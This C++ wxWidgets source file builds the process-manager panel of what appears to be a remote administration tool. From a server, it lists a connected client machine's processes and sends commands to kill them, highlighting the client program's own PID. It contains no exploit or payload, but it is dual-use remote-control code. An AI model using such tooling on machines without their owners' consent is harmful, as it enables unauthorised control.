#include "panel_process_manager.hpp"
#include "frame_client.hpp"
#include "misc.hpp"
#include "server.hpp"

extern Servidor* p_Servidor;
extern std::mutex vector_mutex;

wxBEGIN_EVENT_TABLE(ListCtrlManager2, wxListCtrl)
	EVT_MENU(EnumIDS::ID_PM_Refrescar, ListCtrlManager2::OnRefrescar)
	EVT_MENU(EnumIDS::ID_PM_Kill, ListCtrlManager2::OnTerminarPID)
	EVT_CONTEXT_MENU(ListCtrlManager2::OnContextMenu)
wxEND_EVENT_TABLE()

panelProcessManager::panelProcessManager(wxWindow* pParent) :
	wxPanel(pParent, EnumIDS::ID_PM_Panel) {

	wxWindow* wxTree = (MyTreeCtrl*)this->GetParent();
	if (wxTree) {
		wxPanel* panel_cliente = (wxPanel*)wxTree->GetParent();
		if (panel_cliente) {
			FrameCliente* frame_cliente = (FrameCliente*)panel_cliente->GetParent();
			if (frame_cliente) {
				this->sckCliente = frame_cliente->sckCliente;
			}
		}
	}

	this->CrearListview();

}

void panelProcessManager::CrearListview() {
	this->listManager = new ListCtrlManager2(this, EnumIDS::ID_Panel_FM_List, wxDefaultPosition, wxSize(FRAME_CLIENT_SIZE_WIDTH, 400), wxBORDER_THEME | wxLC_REPORT | wxLC_SINGLE_SEL | wxLC_HRULES | wxLC_VRULES | wxEXPAND);
	this->listManager->sckCliente = this->sckCliente;

	wxListItem itemCol;
	itemCol.SetText("PID");
	itemCol.SetWidth(50);
	itemCol.SetAlign(wxLIST_FORMAT_CENTRE);
	this->listManager->InsertColumn(0, itemCol);

	itemCol.SetText("Nombre");
	itemCol.SetAlign(wxLIST_FORMAT_LEFT);
	itemCol.SetWidth(250);
	this->listManager->InsertColumn(1, itemCol);

	itemCol.SetText("Usuario");
	itemCol.SetWidth(250);
	this->listManager->InsertColumn(2, itemCol);
}

void ListCtrlManager2::OnRefrescar(wxCommandEvent& event) {
	this->DeleteAllItems();
	std::string strComando = std::to_string(EnumComandos::PM_Refrescar);
	strComando.append(1, '~');
	p_Servidor->cSend(this->sckCliente, strComando.c_str(), strComando.size(), 0, false);
	return;
}

void ListCtrlManager2::OnTerminarPID(wxCommandEvent& event) {
	long item = this->GetNextItem(-1, wxLIST_NEXT_ALL, wxLIST_STATE_SELECTED);
	std::string strComando = std::to_string(EnumComandos::PM_Kill);
	strComando.append(1, '~');
	strComando += this->GetItemText(item, 0);
	p_Servidor->cSend(this->sckCliente, strComando.c_str(), strComando.size(), 0, false);
	return;
}

void ListCtrlManager2::AgregarData(std::string strBuffer, std::string _strPID){
	// PID ~ pNAME ~ HOST/USER |
	std::vector<std::string> vc_Proc = strSplit(strBuffer, '|', 1000);
	int iCount = 0;
	for (auto aProceso : vc_Proc) {
		std::vector<std::string> vc_Detail = strSplit(aProceso, '~', 3);
		if (vc_Detail.size() == 3) {
			this->InsertItem(iCount, vc_Detail[0]);
			this->SetItem(iCount, 1, vc_Detail[1]);
			this->SetItem(iCount, 2, vc_Detail[2]);
			if (vc_Detail[0] == _strPID) { //PID del cliente
				this->SetItemTextColour(iCount, *wxRED);
			}
			iCount++;
		}
	}
}

void ListCtrlManager2::ShowContextMenu(const wxPoint& pos, bool isEmpty) {
	wxMenu menu;

	if (isEmpty) {
		menu.Append(EnumIDS::ID_PM_Refrescar, "Refrescar");
	}else {
		menu.Append(EnumIDS::ID_PM_Refrescar, "Refrescar");
		menu.AppendSeparator();
		menu.Append(EnumIDS::ID_PM_Kill, "Terminar proceso");
	}

	PopupMenu(&menu, pos.x, pos.y);
	
}

void ListCtrlManager2::OnContextMenu(wxContextMenuEvent& event) {
	if (GetEditControl() == NULL)
	{
		wxPoint point = event.GetPosition();

		// If from keyboard
		if ((point.x == -1) && (point.y == -1))
		{
			wxSize size = GetSize();
			point.x = size.x / 2;
			point.y = size.y / 2;
		}
		else
		{
			point = ScreenToClient(point);
		}

		int flags;
		long iItem = HitTest(point, flags);

		ShowContextMenu(point, iItem == -1 ? true : false);

	}
	else {
		event.Skip();
	}
}